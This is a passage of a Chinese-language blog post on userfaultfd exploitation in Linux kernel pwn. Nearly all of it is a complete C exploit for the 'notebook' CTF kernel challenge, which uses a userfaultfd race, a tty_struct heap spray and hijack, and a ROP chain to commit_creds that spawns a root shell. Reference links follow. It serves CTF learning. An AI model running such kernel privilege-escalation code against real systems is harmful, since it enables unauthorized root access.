class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myusfd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RSP_RBP_POP_RBP_RET 0xffffffff8107875c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_POP_RBP_RET \</span></span><br><span class="line"><span class="meta">    0xffffffff81045833  <span class="comment">// mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je</span></span></span><br><span class="line">                        <span class="comment">// 0x245843; pop rbp; ret;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff810637d4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xffffffff810338bb</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_POP_R12_POP_RBP_RET 0xffffffff810880c1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RSI_POP_RDI_POP_RBX_RET 0xffffffff81079c38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBP_RET 0xffffffff81000367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBX_POP_RBP_RET 0xffffffff81002141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_POP_RBX_POP_RBP_RET 0xffffffff810cadf7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> notefd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* page;</span><br><span class="line"><span class="type">char</span>* note_buf;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>, kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">sem_t</span> sem_add, sem_edit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125; Note;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="type">int</span> nread;</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    uffd = (<span class="type">long</span>)arg;</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for stuck</span></span><br><span class="line">    sleep(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nread &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// char* page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,</span></span><br><span class="line">    <span class="comment">//                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span></span><br><span class="line">    <span class="comment">// if (page == MAP_FAILED) &#123;</span></span><br><span class="line">    <span class="comment">//     errExit(&quot;[-] mmap err&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(note_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(note_buf));</span><br><span class="line">    uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)note_buf;</span><br><span class="line">    uffdio_copy.dst =</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uffdio_copy.len = PAGE_SIZE;</span><br><span class="line">    uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">    uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">        <span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell &quot;</span></span><br><span class="line">        <span class="string">&quot;now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx,<span class="type">size_t</span> size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    Note note = &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(notefd, <span class="number">0x100</span>, &amp;note);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    Note note = &#123;.idx = idx&#125;;</span><br><span class="line">    ioctl(notefd, <span class="number">0x200</span>, &amp;note);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    Note note = &#123;.buf = buf&#125;;</span><br><span class="line">    ioctl(notefd, <span class="number">0x64</span>, &amp;note);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx,<span class="type">size_t</span> size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    Note note = &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(notefd, <span class="number">0x300</span>, &amp;note);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">evilEdit</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    sem_wait(&amp;sem_edit);</span><br><span class="line">    <span class="comment">//try realloc 0 ?</span></span><br><span class="line">    noteedit((<span class="type">int</span>)args, <span class="number">0x2000</span>, page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">evilAdd</span><span class="params">(<span class="type">void</span>* args)</span> &#123;</span><br><span class="line">    sem_wait(&amp;sem_add);</span><br><span class="line">    noteadd((<span class="type">int</span>)args, <span class="number">0x50</span>, page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125; notebook[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">/********************* Initial  *****************/</span></span><br><span class="line">    <span class="type">int</span> tty_fd[<span class="number">0x100</span>], tty_idx, fake_tty_ops_idx = <span class="number">-1</span>, fake_stack_idx = <span class="number">-1</span>,</span><br><span class="line">                                hit_tty = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> tty_data[<span class="number">0x200</span>], fake_tty_data[<span class="number">0x200</span>], tty_ops,</span><br><span class="line">        fake_tty_ops_data[<span class="number">0x200</span>], rop[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">pthread_t</span> <span class="type">tmp_t</span>, <span class="type">add_t</span>, <span class="type">edit_t</span>;</span><br><span class="line"></span><br><span class="line">    page = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    note_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    userfault_register(page, fault_handler_thread);</span><br><span class="line">    saveStatus();</span><br><span class="line">    sem_init(&amp;sem_add, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_edit, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    notefd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">strcpy</span>(note_buf, <span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        noteadd(i, <span class="number">0x60</span>, note_buf);</span><br><span class="line">        noteedit(i, TTY_STRUCT_SIZE, note_buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Notebook initialization done.\033[0m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get all the note free and get the threads stuck by userfaultfd to save</span></span><br><span class="line">    <span class="comment">// their ptrs</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;<span class="type">edit_t</span>, <span class="literal">NULL</span>, evilEdit, (<span class="type">void</span>*)i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        sem_post(&amp;sem_edit);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Edit threads trapped in userfaultfd.\033[0m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// heap spraying to hit the tty_struct</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++)</span><br><span class="line">        tty_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change the size stored in notebook to pass _check_object_size and get the</span></span><br><span class="line">    <span class="comment">// threads stuck by userfaultfd to save the ptrs</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        pthread_create(&amp;<span class="type">add_t</span>, <span class="literal">NULL</span>, evilAdd, (<span class="type">void</span>*)i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        sem_post(&amp;sem_add);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Add threads trapped in userfaultfd.\033[0m&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check whether we&#x27;ve hit the tty_struct</span></span><br><span class="line">    notegift((<span class="type">char</span>*)notebook);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        read(notefd, tty_data, i);</span><br><span class="line">        <span class="keyword">if</span> (hit_tty = (*((<span class="type">int</span>*)tty_data) == <span class="number">0x5401</span>)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx &quot;</span></span><br><span class="line">                <span class="string">&quot;\033[0m%d.\n&quot;</span>,</span><br><span class="line">                tty_idx = i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>,</span><br><span class="line">                   notebook[i].buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!hit_tty)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to hit the tty struct.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] read tty success \n&quot;</span>);</span><br><span class="line">    <span class="comment">// get kernel base</span></span><br><span class="line">    tty_ops = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(tty_data + <span class="number">3</span>);</span><br><span class="line">    kernel_offset = ((tty_ops &amp; <span class="number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="number">0xfff</span>)</span><br><span class="line">                         ? (tty_ops - PTY_UNIX98_OPS)</span><br><span class="line">                         : tty_ops - PTM_UNIX98_OPS);</span><br><span class="line">    kernel_base = (<span class="type">void</span>*)((<span class="type">size_t</span>)kernel_base + kernel_offset);</span><br><span class="line">    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m%p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] prepare_kernel_cred: \033[0m%p\n&quot;</span>,</span><br><span class="line">           prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: &quot;</span></span><br><span class="line">        <span class="string">&quot;\033[0m%p\n&quot;</span>,</span><br><span class="line">        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n\033[32m\033[1m[+] just for debug :%p\n\n&quot;</span>,</span><br><span class="line">           PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset);</span><br><span class="line">    notegift((<span class="type">char</span>*)notebook);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        read(notefd, tty_data, i);</span><br><span class="line">        <span class="keyword">if</span> (*((<span class="type">int</span>*)tty_data) != <span class="number">0x5401</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fake_tty_ops_idx == <span class="number">-1</span>)</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    <span class="string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx &quot;</span></span><br><span class="line">                    <span class="string">&quot;\033[0m%d.\n&quot;</span>,</span><br><span class="line">                    fake_tty_ops_idx = i);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>,</span><br><span class="line">                       fake_stack_idx = i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fake_tty_ops_idx == <span class="number">-1</span> || fake_stack_idx == <span class="number">-1</span>)</span><br><span class="line">        errExit(</span><br><span class="line">            <span class="string">&quot;Unable to find enough available notes, you\&#x27;re so lucky that you &quot;</span></span><br><span class="line">            <span class="string">&quot;got so many tty_structs.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    noteedit(fake_tty_ops_idx, TTY_STRUCT_SIZE, fake_tty_data);</span><br><span class="line">    noteedit(fake_stack_idx, <span class="number">0x100</span>, rop);</span><br><span class="line">    notegift((<span class="type">char</span>*)notebook);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>,</span><br><span class="line">        notebook[fake_tty_ops_idx].buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>,</span><br><span class="line">           notebook[fake_stack_idx].buf);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">20</span>);</span><br><span class="line">    <span class="comment">// restore tty_struct data</span></span><br><span class="line">    read(notefd, tty_data, tty_idx);</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_data, tty_data, <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">struct</span> tty_operations*)fake_tty_ops_data)-&gt;write =</span><br><span class="line">        PUSH_RDI_POP_RSP_POP_RBP_ADD_RAX_RDX_RET + kernel_offset;</span><br><span class="line">    <span class="comment">// second migration back to tty_operations</span></span><br><span class="line">    fake_tty_data[<span class="number">1</span>] = POP_RBX_POP_RBP_RET + kernel_offset;</span><br><span class="line">    fake_tty_data[<span class="number">3</span>] = notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    fake_tty_data[<span class="number">4</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// third migration to a note</span></span><br><span class="line">    fake_tty_ops_data[<span class="number">1</span>] = POP_RBP_RET + kernel_offset;</span><br><span class="line">    fake_tty_ops_data[<span class="number">2</span>] = notebook[fake_stack_idx].buf;</span><br><span class="line">    fake_tty_ops_data[<span class="number">3</span>] = MOV_RSP_RBP_POP_RBP_RET + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// final rop</span></span><br><span class="line">    <span class="type">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0x3361626e74747261</span>;  <span class="comment">// arttnba3</span></span><br><span class="line">    rop[rop_idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = prepare_kernel_cred;</span><br><span class="line">    rop[rop_idx++] = POP_RDX_RET + kernel_offset;</span><br><span class="line">    rop[rop_idx++] = RET;</span><br><span class="line">    rop[rop_idx++] = MOV_RDI_RAX_POP_RBP_RET + kernel_offset;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0x3361626e74747261</span>;  <span class="comment">// arttnba3</span></span><br><span class="line">    rop[rop_idx++] = commit_creds;</span><br><span class="line">    rop[rop_idx++] =</span><br><span class="line">        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span> + kernel_offset;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = (<span class="type">size_t</span>)&amp;getRootShell;</span><br><span class="line">    rop[rop_idx++] = user_cs;</span><br><span class="line">    rop[rop_idx++] = user_rflags;</span><br><span class="line">    rop[rop_idx++] = user_sp;</span><br><span class="line">    rop[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(notefd, rop, fake_stack_idx);  <span class="comment">// copy the ropchain</span></span><br><span class="line">    write(notefd, fake_tty_ops_data,</span><br><span class="line">          fake_tty_ops_idx);                 <span class="comment">// hijack the tty_operations</span></span><br><span class="line">    write(notefd, fake_tty_data, tty_idx);  <span class="comment">// hijack the tty_struct</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++)</span><br><span class="line">        write(tty_fd[i], note_buf, <span class="number">233</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>此时的rdi&#x3D;tty_struct ，这里这位师傅用了两次栈迁移 ，rop链相对繁琐一些 </p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221101034315777.png" alt="image-20221101034315777"></p>
<p>参考：</p>
<p>Linux 手册 <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">https://man7.org/linux/man-pages/man2/userfaultfd.2.html</a></p>
<p>浅析 userfaultfd 在 kernel pwn 中的利用 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835#h3-5">https://www.anquanke.com/post/id/253835#h3-5</a></p>
<p>从强网杯 2021 线上赛题目 notebook 中浅析 userfaultfd 在 kernel pwn 中的利用 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253835#h3-8">https://www.anquanke.com/post/id/253835#h3-8</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>7r1p13J</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://7r1pl3j.github.io/2022/11/01/userfaultfd/">https://7r1pl3j.github.io/2022/11/01/userfaultfd/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
